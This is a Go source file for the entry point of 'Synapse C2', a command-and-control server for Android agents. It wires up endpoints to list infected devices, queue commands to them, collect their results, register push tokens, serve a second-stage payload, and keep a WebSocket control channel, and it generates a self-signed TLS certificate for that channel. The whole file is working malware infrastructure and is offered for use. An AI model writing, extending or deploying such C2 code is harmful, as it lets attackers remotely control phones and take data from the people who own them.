package cmd

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"os"
	"path/filepath"
	"time"

	"synapse-c2/app/synapse-c2/internal/controller/c2"
	"synapse-c2/app/synapse-c2/internal/service"

	"github.com/gogf/gf/v2/frame/g"
	"github.com/gogf/gf/v2/net/ghttp"
	"github.com/gogf/gf/v2/os/gcmd"
)

const (
	defaultAddr = ":8443"
	certFile    = "server.crt"
	keyFile     = "server.key"
)

var (
	Main = gcmd.Command{
		Name:  "synapse-c2",
		Usage: "synapse-c2",
		Brief: "Synapse C2 Server — Command & Control for Android Agents",
		Func: func(ctx context.Context, parser *gcmd.Parser) (err error) {
			s := g.Server()

			// Configure server
			addr := defaultAddr
			if envAddr := os.Getenv("C2_LISTEN"); envAddr != "" {
				addr = envAddr
			}
			s.SetAddr(addr)

			// Set up controllers and middleware
			ctrl := c2.New()

			s.Group("/", func(group *ghttp.RouterGroup) {
				group.Middleware(ghttp.MiddlewareHandlerResponse)

				// REST API
				group.GET("/api/health", ctrl.Health)
				group.GET("/api/devices", ctrl.ListDevices)
				group.POST("/api/command", ctrl.QueueCommand)
				group.POST("/api/result", ctrl.ReceiveResult)
				group.POST("/api/register-fcm", ctrl.RegisterFCM)
				group.GET("/api/stage2", ctrl.ServeStage2)
				group.GET("/api/events", ctrl.SSEEvents)

				// WebSocket endpoint
				group.GET("/c2", ctrl.WebSocketHandler)
			})

			// Serve embedded dashboard from resource/public/
			s.AddStaticPath("/", "resource/public")

			// CORS middleware for dashboard
			s.BindMiddlewareDefault(func(r *ghttp.Request) {
				r.Response.CORSDefault()
				r.Middleware.Next()
			})

			// TLS setup
			tlsConfig, err := ensureTLS()
			if err != nil {
				g.Log().Fatalf(ctx, "TLS setup failed: %v", err)
			}
			s.SetTLSConfig(tlsConfig)

			// Start offline checker goroutine
			go offlineChecker(ctx)

			// Print startup banner
			printBanner(addr)

			g.Log().Infof(ctx, "Synapse C2 Server starting on %s", addr)
			s.Run()
			return nil
		},
	}
)

// ensureTLS loads or generates a self-signed TLS certificate.
func ensureTLS() (*tls.Config, error) {
	resDir := "/home/hp/UMBRA/Umbra-Server/synapse-c2/app/synapse-c2/resource"
	certPath := filepath.Join(resDir, certFile)
	keyPath := filepath.Join(resDir, keyFile)

	if fileExists(certPath) && fileExists(keyPath) {
		cert, err := tls.LoadX509KeyPair(certPath, keyPath)
		if err != nil {
			return nil, fmt.Errorf("load existing cert: %w", err)
		}
		return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}, nil
	}

	// Generate new self-signed cert
	fmt.Printf("\033[1;33m[*] Generating self-signed TLS certificate...\033[0m\n")

	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("generate key: %w", err)
	}

	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return nil, fmt.Errorf("generate serial: %w", err)
	}

	template := x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			CommonName:   "synapse-c2",
			Organization: []string{"Synapse C2"},
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour), // 1 year
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		IPAddresses:           []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("0.0.0.0")},
		DNSNames:              []string{"localhost"},
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return nil, fmt.Errorf("create cert: %w", err)
	}

	// Write cert
	certOut, err := os.Create(certPath)
	if err != nil {
		return nil, fmt.Errorf("create cert file: %w", err)
	}
	defer certOut.Close()
	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes})

	// Write key
	keyOut, err := os.Create(keyPath)
	if err != nil {
		return nil, fmt.Errorf("create key file: %w", err)
	}
	defer keyOut.Close()
	privBytes, _ := x509.MarshalECPrivateKey(priv)
	pem.Encode(keyOut, &pem.Block{Type: "EC PRIVATE KEY", Bytes: privBytes})

	fmt.Printf("\033[1;32m[+] TLS certificate saved to app/synapse-c2/resource/%s and app/synapse-c2/resource/%s\033[0m\n",
		certFile, keyFile)

	tlsCert, err := tls.X509KeyPair(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: derBytes}),
		pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: privBytes}))
	if err != nil {
		return nil, fmt.Errorf("load generated cert: %w", err)
	}

	return &tls.Config{Certificates: []tls.Certificate{tlsCert}, MinVersion: tls.VersionTLS12}, nil
}

// offlineChecker periodically marks stale devices as offline.
func offlineChecker(ctx context.Context) {
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			service.Registry.CheckOffline(45 * time.Second)
		}
	}
}

// printBanner prints the startup banner.
func printBanner(addr string) {
	host, port, err := net.SplitHostPort(addr)
	if err != nil || host == "" {
		host = "0.0.0.0"
		port = "8443"
	}

	C := "\033[1;36m"
	B := "\033[1m"
	R := "\033[0m"
	G := "\033[1;32m"
	Y := "\033[1;33m"

	banner := `
` + C + `  ╔══════════════════════════════════════════════════════╗` + R + `
` + C + `  ║` + B + `     ███████╗██╗   ██╗███╗   ██╗ █████╗ ██████╗ ███████╗███████╗     ` + C + `  ║` + R + `
` + C + `  ║` + B + `     ██╔════╝╚██╗ ██╔╝████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔════╝     ` + C + `  ║` + R + `
` + C + `  ║` + B + `     ███████╗ ╚████╔╝ ██╔██╗ ██║███████║██████╔╝███████╗█████╗       ` + C + `  ║` + R + `
` + C + `  ║` + B + `     ╚════██║  ╚██╔╝  ██║╚██╗██║██╔══██║██╔═══╝ ╚════██║██╔══╝       ` + C + `  ║` + R + `
` + C + `  ║` + B + `     ███████║   ██║   ██║ ╚████║██║  ██║██║     ███████║███████╗     ` + C + `  ║` + R + `
` + C + `  ║` + B + `     ╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝     ` + C + `  ║` + R + `
` + C + `  ║                                                                         ║` + R + `
` + C + `  ║     ` + Y + `C2 Server v1.0.0 — GoFrame Edition` + R + `                                ` + C + `  ║` + R + `
` + C + `  ╚══════════════════════════════════════════════════════╝` + R + `
`
	fmt.Print(banner)
	fmt.Printf("\n  %s[+]%s Listening:    %shttps://%s:%s%s\n", G, R, B, host, port, R)
	fmt.Printf("  %s[+]%s Dashboard:    %shttps://%s:%s/%s\n", G, R, B, host, port, R)
	fmt.Printf("  %s[+]%s WebSocket:    %swss://%s:%s/c2%s\n", G, R, B, host, port, R)
	fmt.Printf("  %s[+]%s API Health:   %shttps://%s:%s/api/health%s\n", G, R, B, host, port, R)
	fmt.Println()
}

// fileExists checks if a file exists.
func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}
